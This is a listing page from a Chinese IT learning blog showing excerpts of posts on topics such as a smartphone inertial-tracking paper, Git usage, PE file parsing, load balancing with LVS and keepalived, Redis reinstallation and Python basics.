<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18bbcc424a086e11408759d5f52710ff/" rel="bookmark">
			基于智能手机的行人惯性追踪数据集模型与部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文总结 这篇《 Smartphone-based Pedestrian Inertial Tracking: Dataset, Model, and Deployment 》论文介绍了一种基于智能手机惯性测量单元（IMU）的行人追踪和定位系统。主要内容和贡献如下：
数据集和实验设计：作者开发了一个智能手机惯性测量数据集（SIMD），包含超过4500条步行轨迹，涵盖了约190小时的行走时间和700多公里的总行程。数据集覆盖了4个城市、12种室内外场景、7种手机姿态，并由150多名志愿者使用他们的智能手机收集数据。实时追踪模型：论文采用了一种轻量级的深度神经网络（DNN）框架——时间卷积网络（TCN），有效地建模长期序列数据，并且容易在边缘设备上部署。作者从原始IMU读数中提取运动特征，包括四个时域特征（最大值、最小值、平均值和标准差）和六个频域特征（平均值、标准差、信息熵、能量、偏度和峰度）。TCN模型由七层全连接层和三个TCN残差块组成，使用因果卷积和扩张因子来增加模型的感受野。方向估计：为了估计行人的朝向变化，论文通过将三轴陀螺仪的读数投影到平面姿态上，并积分z轴的角速率，来生成表示行人朝向变化的平面表示。轨迹校正：由于长期积分陀螺仪读数可能导致较大的累积误差，论文探索了一种线性拟合算法来校正轨迹。这包括识别转角、将轨迹分割为段落，并对每个段落进行最小二乘法拟合以平滑轨迹点和去除离群点。模型定制：为了适应不同用户的使用习惯、传感器类型和不同的环境，论文提出了一种模型定制机制。这包括在云服务器上训练通用惯性追踪模型，然后在智能手机上对模型进行个人化微调，以提高模型在边缘设备上的性能。实验验证：论文进行了一系列实验来验证提出的方法。这包括使用外部收集的数据训练通用模型，以及使用特定数据进行定制训练和离线推断。实验结果表明，该方法在多种评估指标上优于现有技术。 总体而言，这项研究通过智能手机IMU数据和深度学习技术，提出了一种有效的行人追踪和定位系统，并通过大规模数据收集和模型定制，提高了系统的精度和适用性。
新技术点 如何在智能手机上本地执行模型的微调和部署? 在论文《基于智能手机的行人惯性追踪：数据集、模型和部署》中，模型在用户的智能手机上进行本地训练和部署是通过以下方式实现的：
使用Deeplearning4j框架：模型训练和部署是通过Deeplearning4j（DL4J）实现的。DL4J是一个适用于Java的开源深度学习库，支持从主流框架（如PyTorch、TensorFlow和Keras）导入和重新训练模型，同时也支持在物联网（IoT）设备上部署模型，包括智能手机和手环等。DL4J提供轻量级子模块，如Nd4j、Libnd4j和Datavec等，这些模块提高了数据处理效率并提供了类似Python的操作。网络迁移：通过DL4J将服务器端网络迁移到安卓智能手机上，以定制通用模型。这一过程涉及将在云端训练好的模型适应到特定用户的智能手机环境中。模型构建：使用DL4J中的ComputationGraph类构建模型，并在ComputationGraphConfiguration类中配置网络的详细信息。 总之，论文中的模型是通过在智能手机上本地执行DL4J框架来实现的，这种方法使得模型能够适应用户的个性化需求，同时在资源受限的边缘设备上实现有效的深度学习模型训练和部署。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/016bf91a8a89091e70f047f9373f9d9c/" rel="bookmark">
			HTML5-新增表单input属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新增表单属性 form控件主要新增的属性:
autocomplete 是否启用表单的自动完成功能，取值：on（默认）、off
novalidate 提交表单时不进行校验，默认会进行表单校验
autocomplete属性 概念：autocomplete属性规定input 控件是否启用自动完成功能
语法：
&lt;input type="text" autocomplete="属性值" /&gt; 属性值：
on：默认值。表示开启，浏览器会尝试自动完成输入框中的输入，以提供对以前输入过的值的可能匹配
off：表示关闭，禁用浏览器或网页自动填充功能
autocomplete属性适用于所有文本框型的input元素
实例：
&lt;form action="" method="post"&gt; &lt;input type="text" autocomplete="on" list="tips"&gt; &lt;datalist id="tips"&gt; &lt;option value="数学"&gt;&lt;/option&gt; &lt;option value="语文"&gt;&lt;/option&gt; &lt;option value="英语"&gt;&lt;/option&gt; &lt;option value="化学"&gt;&lt;/option&gt; &lt;/datalist&gt; &lt;/form&gt; 运行结果
novalidate属性 概念：novalidate属性就是来禁用form元素的所有文本框内置的验证功能
语法：
&lt;form novalidate&gt; ... &lt;/form&gt; 实例：
&lt;form action="" novalidate&gt; &lt;p&gt; &lt;label for="email"&gt;电子邮件：&lt;/label&gt; &lt;input type="email" name="email" id="email" /&gt; &lt;/p&gt; &lt;p&gt; &lt;label for="tel"&gt;手机号码：&lt;/label&gt; &lt;input type="tel" name="tel" id="tel"/&gt; &lt;/p&gt; &lt;input type="submit" value="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/016bf91a8a89091e70f047f9373f9d9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33f15e526b55ece9f796fb24b24d3581/" rel="bookmark">
			论文阅读——SG-Former
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SG-Former: Self-guided Transformer with Evolving Token Reallocation
1. Introduction
方法的核心是利用显著性图，根据每个区域的显著性重新分配tokens。显著性图是通过混合规模的自我关注来估计的，并在训练过程中自我进化。直观地说，我们将更多的tokens分配给显著区域，以实现细粒度的关注，而将更少的tokens分配到次要区域，以换取效率和全局感受场。
2. Method
hybrid-scale Transformer block提取混合尺度对象和多粒度信息，指导区域重要性；self-guided Transformer block根据混合尺度Transformer块的显著性信息，在保持显著区域细粒度的同时，对全局信息进行建模。
2.1 Self-Guided Attention
通过将几个tokens合并为一个token聚合来减少序列长度这种减少注意力计算的聚合方法面临两个问题：（i）信息可能在显著区域丢失或与不相关的信息混合，（ii）在次要区域或背景区域，许多标记（序列的较高比例）对于简单语义是冗余的，同时需要大量计算。
输入特征图：，映射为Q、K、V
然后H个相互独立的自注意力头平行的计算自注意力，为了计算注意力后保持特征图大小不变的同时降低计算成本，使用重要性引导聚合模块（IAM）固定Q的长度，但聚合K和V的tokens。
其中是significance map。将S的值生序排列，分为n个子区域。s1是最不重要的，Sn是最重要的。r是聚合率，每r个tokens聚合在一起。在不同重要性的区域设置了不同的聚合率r1，··，rn，使得每个子区域都有一个聚合率，并且子区域越重要，聚合率越小。
IAM的目标是在显著区域将更少的令牌聚合为一（即，保留更多），在背景区域将更多的令牌聚合成一（即保留更少）。
然后：
F是聚合函数。
2.2 Hybrid-scale Attention
H个heads分成h组，每组H/h个heads。
将聚合成一个，Q不聚合，这样A和KV的数量不一样了，然后将QKV分窗口，窗口大小M，Q和KV数量不一样，所以Q的窗口大小是：
计算注意力：
计算significance map：
3 实验结果
反正现在试的，这个模型比VIT快很多，计算量也少很多，但是不知道效果，实验结果还没出来。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a77ed89dbce4acfc897c926d843437d/" rel="bookmark">
			2024年原创深度学习算法项目分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原创深度学习算法项目分享，包括以下领域：
图像视频、文本分析、知识图谱、推荐系统、问答系统、强化学习、机器学习、多模态、系统界面、爬虫、增量学习等领域…
有需要的话，评论区私聊
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/666588bdd613541d5425aa446e0bfe85/" rel="bookmark">
			Git 常用命令知识笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Git 仓库数据结构 Git 仓库由一个个的 commit 组成某些 commit 上会有一些 branch 指向它们，这些 branch 的本质是引用有一个特殊的引用叫做 HEAD，它始终指向当前的位置，这个位置可以是 commit，也可以是 branch staging area 暂存区和 add staging 原意：舞台表演前的筹划准备（例如汇集道具和演员）。Git 中的意思：把改动内容汇集起来以待提交。staging area：待提交的修改内容暂时存放的地方。主要用于和已经改动但不打算提交的内容区分开来。add 指令：把指定的内容放进暂存区。 Workspace：工作区Stage：暂存区Repository：仓库区（本地仓库）Remote：远程仓库 git add [file1] [file2] ... # 添加指定文件到暂存区 git add [dir] # 添加指定目录到暂存区，包括子目录 git add . # 添加当前目录的所有文件到暂存区 git add -p # 添加每个变化前，都会要求确认 # 对于同一个文件的多处变化，可以实现分次提交 git rm [file1] [file2] ... # 删除工作区文件，并且将这次删除放入暂存区 git rm --cached [file] # 停止追踪指定文件，但该文件会保留在工作区 git mv [file-original] [file-renamed] # 改名文件，并且将这个改名放入暂存区 git commit commit 表示对于一次改动的提交，它可以代表当前时刻下 Git 仓库的完整快照，但本质上，commit 只是记录了距离上一次 commit 之间的改动。 git commit -m [message] # 提交暂存区到仓库区 git commit [file1] [file2] .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/666588bdd613541d5425aa446e0bfe85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed5358e373ae2503c5c76f1880e4cfba/" rel="bookmark">
			Android Studio使用Git提交、分支、切换、合并
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitLab平台创建新项目 首先到Git托管平台上创建一个空的项目，公司使用的Git托管平台是GitLab，所以先到GitLab上面创建一个项目：
点击右上角的加号按钮，打开创建页面，输入项目名称、描述、选择项目的路径，点击create，会创建一个新的空项目出来, 在GitLab上面进入刚创建的项目查看，可以看到GitLab为我们列出了常用的Git命令:
由于是首次创建项目是空的，所以我们本地先提交一个工程代码上去
先找一个目录执行：git clone git@gitlab.xxx.com:xxx/DemoProject.git拉取远程仓库
这里使用的是windows平台的客户端（gitforwindows），在git bash中输入命令会克隆下来一个空目录到本地
然后我们用Android Studio创建一个工程项目：
将创建的工程文件复制到刚才clone下来的仓库目录里，或者在AS创建项目的时候项目路径选择刚才clone下来的目录
由于是第一次提交，我们需要打开根目录下.gitignore文件忽略一些不必要的文件如build、.idea、iml等, 在.gitignore文件中输入下面内容并保存：
*.iml .gradle /.idea /local.properties /.idea/libraries /.idea/modules.xml /.idea/workspace.xml .DS_Store /build /captures .externalNativeBuild 同样在工程下面的每个module目录下面也有一个.gitignore文件，我们在其中输入下面内容并保存：
*.iml /build 然后在该目录下依次执行下面命令：
git add . git commit -m "添加项目文件" git push 这样项目就被提交到远程仓库了，其他人就可以从仓库上clone这个工程的代码
AS中clone远程仓库 我们重新打开AS，选择checkout刚才的提交项目：
在弹出框中输入远程仓库的地址，点击clone即可。当然你可以用命令先clone到文件夹，再从AS中File菜单选择open该目录也可以。
提交代码 AS中的更新和提交基本上都是在工具栏上的这两个按钮，提交代码点击右边的按钮，只不过在AS中提交代码到Git比Svn要多一步push操作。
由于项目没有变动所以提交会提交没有东西可以提交，我们先创建一个类，创建完毕会弹出下面的弹窗：
注意这里一定要勾选Remember, don't ask again, 不然后面新添加的文件你都得手动右键Git菜单去add，勾选之后新创建的文件就会自动被执行add操作。然后我们再修改一个原有的类，完了点击提交按钮：
在弹窗中会列出有变动的文件（包括新增的、修改的、删除的），输入提交日志点击commit, 注意Git到这一步只是提交到本地仓库，并没有提交到远程Git服务器。
这时在AS的Version Control面板中可以看到提交日志记录以及提交的文件：
接下来就是执行push操作，如果以前用惯了SVN的话可能会经常忘记最后一步的push操作：
或者直接在commit的时候点击commit按钮旁边的三角下来选择Commit and Push也可以进行push操作：
提交成功之后AS右下角会有个类似Toast的弹窗提示，并且这时我们再查看AS的Version Control面板中可以看到刚才的提交日志旁边的标签符合会有一点不一样，多了一个origin表示到这一步的改动已经提交到服务端。
这时到浏览器上去查看Gitlab上面的工程也能看到刚刚的提交日志
一般在进行提交操作之前，最好先执行update操作，因为有可能别人提交了代码跟你的有冲突。
创建分支 AS中创建分支可以直接点击右下角的底部工具栏点击Git:master选择New Branch
或者在右键选择Git-Repository-Branches也行
在弹出的弹窗中输入分支名称：
点击OK就会创建新的本地分支，注意这个弹窗有一个Checkout branch复选框，默认是勾上的，这意味着创建完该分支的同时AS会将当前工程切换到该分支下，如果你只是想创建一个新的分支并不想切换到该分支，还是打算留在当前分支的话，那么就不要勾选这个就可以了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed5358e373ae2503c5c76f1880e4cfba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29b75ba7ec8e1f99880bf71ee6fc1800/" rel="bookmark">
			提取 PE 文件的各种信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前段时间项目需要实现对 Windows PE 文件版本信息的提取，如文件说明、文件版本、产品名称、版权、原始文件名等信息。获取这些信息在 Windows 下当然有一系列的 API 函数供调用，简单方便。
我们先看一下PE文件结构，PE文件由DOS首部，PE文件头，块表，块和调试信息组成，有关PE文件的数据结构信息在winnt.h中定义。
文章不过多赘述，直接上代码简单明了。
实现代码：
#include "stdafx.h" #include &lt;Windows.h&gt; extern void DirectoryString(DWORD dwIndex); int _tmain(int argc, _TCHAR* argv[]) { //获取文件句柄 HANDLE hFile = CreateFile( _T("D:\\Wmplayer.exe"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //获取文件大小 DWORD dwFileSize = GetFileSize(hFile, NULL); CHAR *pFileBuf = new CHAR[dwFileSize]; //将文件读取到内存 DWORD ReadSize = 0; ReadFile(hFile, pFileBuf, dwFileSize, &amp;ReadSize, NULL); //判断是否为PE文件 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuf; if (pDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) { printf("非 PE 文件\n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29b75ba7ec8e1f99880bf71ee6fc1800/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1b4e646b8f27684f47de1514009448b/" rel="bookmark">
			python观察图像的幅度谱和相位谱——冈萨雷斯数字图像处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理 在图像处理中，当我们对图像进行傅里叶变换，可以得到两个重要的成分：幅度谱和相位谱。这些成分在图像分析和处理中扮演着关键的角色。
傅里叶变换
傅里叶变换是一种将信号从时域（或空间域）转换到频率域的工具。对于图像，这意味着将像素的空间排列转换为表征图像中不同频率成分的形式。
幅度谱 定义：
幅度谱表示图像中各个频率成分的强度。它给出了频率内容的量度，但不包含频率发生的位置信息。
数学表达：
对于傅里叶变换得到的复数结果
F(u,v)，幅度谱 A(u,v) 定义为：
重要性：
幅度谱显示了图像中不同频率的强度，这对于理解图像的结构非常重要。例如，高频成分常常对应于图像中的边缘和细节部分。
相位谱定义： 相位谱包含了频率成分在图像中出现的位置信息。它描述了不同频率分量相对于基频的相位差。
数学表达：
相位谱 Φ(u,v) 定义为：
重要性：
相位谱在图像重建中非常重要。它决定了图像中不同频率成分的相对位置，对图像的视觉内容有重大影响。实验表明，相位信息对于人眼识别图像内容比幅度信息更为关键。
综合应用
在图像处理中，幅度谱和相位谱常常被用于图像分析、图像增强、滤波以及图像压缩等任务。例如，通过修改幅度谱和相位谱，可以实现图像的去噪、锐化等效果。然而，需要注意的是，过度修改这些谱可能会导致图像内容的严重失真。
要求实现下述图像
提示 由函数np.fft.fft2可以得到傅里叶变换系数（复数），用np.abs计算复数幅度谱，用np.angle计算相位谱。分别得到矩形图和妇女图的幅度谱及相位谱后，根据公式F(u,v)=|F(u,v)| e^(jϕ(u,v))可以计算出融合后的傅里叶变换系数。其中|F(u,v)|为幅度谱，ϕ(u,v)为相位谱。最后如上一个实验一样，经过np.fft.ifft2函数做傅里叶反变换得到融合后的图像。
代码实现 import cv2 import numpy as np from matplotlib import pyplot as plt img_rec = cv2.imread('Fig0424.tif', 0) img_woman = cv2.imread('Fig0427.tif', 0) dft_rec = np.fft.fft2(img_rec) amp_rec = np.abs(dft_rec) pha_rec = np.angle(dft_rec) dft_woman = np.fft.fft2(img_woman) amp_woman = np.abs(dft_woman) pha_woman = np.angle(dft_woman) # 妇女图的相位和矩形图的幅度融合 img_mix1_dft = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1b4e646b8f27684f47de1514009448b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cdc922e5424f130a7e31b7404078412/" rel="bookmark">
			GAMES101：作业4记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 总览算法编写代码：recursive_bezier()的实现Bezier()函数的实现提高部分：反走样 总览 Bézier 曲线是一种用于计算机图形学的参数曲线。在本次作业中,你需要实现 de Casteljau 算法来绘制由 4 个控制点表示的 Bézier 曲线 (当你正确实现该算法时,你可以支持绘制由更多点来控制的 Bézier 曲线)。
你需要修改的函数在提供的 main.cpp 文件中。
• bezier:该函数实现绘制 Bézier 曲线的功能。它使用一个控制点序列和一个OpenCV::Mat 对象作为输入,没有返回值。它会使 t 在 0 到 1 的范围内进行迭代,并在每次迭代中使 t 增加一个微小值。对于每个需要计算的 t,将调用另一个函数 recursive_bezier,然后该函数将返回在 Bézier 曲线上 t处的点。最后,将返回的点绘制在 OpenCV ::Mat 对象上。
• recursive_bezier:该函数使用一个控制点序列和一个浮点数 t 作为输入,实现 de Casteljau 算法来返回 Bézier 曲线上对应点的坐标。
算法 De Casteljau 算法说明如下：
考虑一个 p0, p1, … pn 为控制点序列的 Bézier 曲线。首先，将相邻的点连接起来以形成线段。用 t : (1 − t) 的比例细分每个线段，并找到该分割点。得到的分割点作为新的控制点序列，新序列的长度会减少一。如果序列只包含一个点，则返回该点并终止。否则，使用新的控制点序列并转到步骤 1。 使用[0,1] 中的多个不同的 t 来执行上述算法，你就能得到相应的 Bézier 曲线。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cdc922e5424f130a7e31b7404078412/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc89d556c11309b12dc0792e3f0ab3e5/" rel="bookmark">
			Visual Studio 2015 中 OpenGL 开发环境的搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Visual Studio 2015 中 OpenGL 开发环境的搭建 Visual Studio 2015 中 OpenGL 开发环境的搭建实现步骤运行结果 Visual Studio 2015 中 OpenGL 开发环境的搭建 本文记录在 Visual Studio 2015 中搭建 OpenGL 环境，网上的很多教程都需要自己编译 GLFW 库，比较麻烦，这里直接使用 NuGet 包安装所需的库，配置 OpenGL 的环境。
GLFW 是一个专门针对 OpenGL 的 C 语言库，它提供了渲染所需的一些接口，允许用户创建 OpenGL 上下文、定义窗口参数以及处理用户输入等。
实现步骤 在 Visual Studio 2015 中新建一个 Visual C++ 空项目。
点击项目-管理NuGet程序包。
搜索 nupengl，并安装 nupengl.core 和 nupengl.core.redist 程序包。
确认安装。
完成安装。
源文件新建main.cpp，代码如下：
//#include &lt;GL/glu.h&gt; #include &lt;GL/glut.h&gt; //#include &lt;GL\freeglut.h&gt; #include &lt;vector&gt; #include &lt;cmath&gt; const int SCREEN_WIDTH = 1024; const int SCREEN_HEIGHT = 1024; const float camera[] = { .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dc89d556c11309b12dc0792e3f0ab3e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ba46419cc78013f5ad72a93befdb462/" rel="bookmark">
			lvs&#43;keepalived&#43;nginx实现四层负载&#43;七层负载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、lvs配置
二、nginx配置
三、测试
3.1 keepalived负载均衡
3.2 lvs+keepalived高可用
3.3 nginx高可用
主机IPlvs01-33 11.0.1.33
lvs02-3411.0.1.34nginx0111.0.1.31nginx0211.0.1.32VIP11.0.1.30 4台主机主机添加host [root@nginx01 sbin]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 11.0.1.31 nginx01 11.0.1.32 nginx02 11.0.1.33 lvs01-33 11.0.1.34 lvs02-34 一、lvs配置 以下两台lvs都要配置，除了配置文件不一样以外
lvs一定要搭配keepalived使用，配置上更简单，并且能实现主备高可用
yum install -y ipvsadm keepalived mv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.conf.bak vi /etc/keepalived/keepalived.conf 主机master
lb_algo字段表示负载调度算法，采用权重算法，nginx01权重为5，nginx02权重为3
需要更改的字段router_id、ens33、priority 100、VIP+端口、真实IP+端口
global_defs { router_id lvs01-33 # 设置lvs的id，在一个网络内应该是唯一的，一般用主机名 } vrrp_instance VI_1 { state MASTER #指定Keepalived的角色，MASTER为主，BACKUP为备 interface ens33 #指定Keepalived的角色，MASTER为主，BACKUP为备 virtual_router_id 51 #虚拟路由编号，主备要一致 priority 100 #定义优先级，数字越大，优先级越高，主DR必须大于备用DR advert_int 1 #检查间隔，默认为1s authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 11.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ba46419cc78013f5ad72a93befdb462/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b8128c304fcdd8281b45644cbd40232/" rel="bookmark">
			设计模式：工厂方法模式（讲故事图文易懂）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 简单工厂工厂方法模式 简单工厂 定义：简单工厂由一个工厂根据参数类型决定创建哪种产品的实例。
简单工厂不包含在23种设计模式之内（简单工厂不满足开闭原则，后面会详细讲）
举例：张三去4S店买了车，显而易见，车不是张三造出来的，车是工厂造出来的，张三获得了该车并能够使用该车，但是造车的细节张三不用知道。
铁蛋在一家汽车工厂上班，这家工厂承接了”小米汽车“和”华为汽车“的生产，一天铁蛋接到了要求，要新开一个”长安汽车“生产线生产长安汽车，铁蛋要怎么做呢？
先写一个简单工厂的例子，再看看铁蛋要怎么做?
简单工厂模式有三个角色：抽象基类（Car）
实现类（XiaoMiCar、HuaWeiCar）
简单工厂类（SimpleFactory）
#include &lt;iostream&gt; #include &lt;string&gt; using namespace std; //抽象基类 class Car { public: Car(string name) : name_(name) {} virtual void Show() = 0; protected: string name_; }; //实现类 class XiaomiCar : public Car { public: XiaomiCar(string name) : Car(name) {} void Show() { cout &lt;&lt; "获得一辆小米轿车: " &lt;&lt; name_ &lt;&lt; endl; } }; //实现类 class HuaweiCar : public Car { public: HuaweiCar(string name) : Car(name) {} void Show() { cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b8128c304fcdd8281b45644cbd40232/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30fcf8925a7b32d174137ba15ef21db6/" rel="bookmark">
			Python学习笔记（四）流程控制方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		流程控制有三种方法：分支、循环、跳出
流程的控制通过布尔值来实现，分支和循环都需要对一定的条件进行判断，根据判断结果（布尔值）决定下一步要做什么
布尔值通过比较运算符、逻辑运算符来进行判断是True还是False
不需要判断直接得到True——数字1，非空数据类型与结构，如非空list，非空string，非空set等
不需要判断直接得到False——数字0，空数据类型与结构
分支 分支是根据条件，让有些代码可以被执行或不被执行
分支关键字有：if、else、elif、pass
#if var = 123 if var == '111': #条件不满足 print('123123123') #条件不满足，不会执行 print('over') #if外的语句，输出over #over #else二选一：条件不满足则执行，条件满足则不执行，else和if都只能出现一次 var = 123 if var == '111': #条件不满足 print('123123123') #条件不满足，不会执行 else: print('ws') #条件不满足，可以满足else，输出ws print('over') #if外的语句，输出over #ws #over #elif：多分支，但要注意条件必须递增 var = 68 if var &gt;= 80: print('优秀') elif var &gt;= 70: print('良好') elif var &gt;= 60: print('及格') else: print('不及格') print('over') #及格 #over #分支嵌套 dict1 = {'ws':'1111','xhy':'2222'} #创建一个包含密码的字典 name = input('username:') if name in dict1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30fcf8925a7b32d174137ba15ef21db6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1eb4fdecf2a36b13182a9f4bac69411b/" rel="bookmark">
			前途光明我看不见，道路曲折我走不完
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023年最后一天了，今年即将结束。
今年在工作上承担了更多的工作，慢慢的已经可以独当一面了，对自己应该学习的东西了解的也更多了。工资也小小的增加了一些。
今年去到了更多的城市，见到了各个城市的样貌。看到了自己心心念念已久的景色。
今年发布了7-8篇文章，在文章的记录上也更加的趋向于原理，只有原理可以更好的驱动我们成长。
今年读完了平凡的世界，明朝的那些事儿也看了一部分。要多看书，从书中获取更多知识。
今年开始思考了一些问题，未来应该安定于何处，应该寻找怎样的配偶。或者说这条路是每个人都必须这样走的吗？目前还没有想到答案，时间应该会将答案交给我。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f84aff0291d08faf3274624ccf13562b/" rel="bookmark">
			Redis（Linux版本7.2.3）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、停止Redis服务器 [root@tssvr1-c1 sysconfig]# ps -ef | grep redis root 322 1 0 10月30 ? 02:58:53 ./bin/redis-server 0.0.0.0:6379 root 32664 12498 0 14:45 pts/0 00:00:00 grep --color=auto redis [root@tssvr1-c1 sysconfig]# [root@tssvr1-c1 sysconfig]# kill -9 322 [root@tssvr1-c1 sysconfig]# [root@tssvr1-c1 sysconfig]# ps -ef | grep redis root 473 12498 0 14:49 pts/0 00:00:00 grep --color=auto redis 2、卸载原有的Redis [root@tssvr1-c1 local]# rm -rf /usr/local/redis [root@tssvr1-c1 local]# rm -rf /usr/bin/redis-* 3、在“/usr/local/“目录下创建”redis“文件，并将redis最新版本的压缩包放入此内 4、解压此压缩包 [root@tssvr1-c1 redis]# tar -zxvf redis-7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f84aff0291d08faf3274624ccf13562b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bff3ebb7dd30aa38f731463c162494e/" rel="bookmark">
			修改css、html后前端没有刷新的解决方法（图文）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 修改css、html后前端没有刷新的解决方法（图文） 修改css、html后前端没有刷新的原因和图文解决方法
1 原因 网页的缓存机制 2 解决方法 禁用网页缓存，具体操作如下 打开F12网络选项勾选禁用缓存。此时再刷新页面即可实时更新
以上就是全部内容，感谢观看！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ddd4e1edfd52a604b8b077cbba7a96e/" rel="bookmark">
			使用Vue.js实现手机系统检测和页面响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：使用Vue.js实现手机系统检测和页面响应
摘要：本文将介绍如何使用Vue.js来检测用户的手机操作系统，并根据操作系统类型进行相应的页面响应。我们将通过编写一个Vue组件，利用用户代理字符串来检测设备类型，并根据检测结果进行页面跳转和标题显示。
一、引言
随着移动互联网的普及，越来越多的用户通过手机访问网站和应用。为了提供更好的用户体验，我们需要根据用户的手机操作系统进行相应的页面优化和功能调整。使用Vue.js，我们可以方便地实现这一需求。
二、技术选型
Vue.js：Vue.js是一款流行的前端框架，用于构建用户界面。它采用组件化的方式组织代码，使得前端开发更加模块化和可维护。
User Agent检测：User Agent检测是一种常用的方法，通过检测用户代理字符串来判断设备类型。用户代理字符串包含了关于浏览器和设备的信息。
三、实现过程
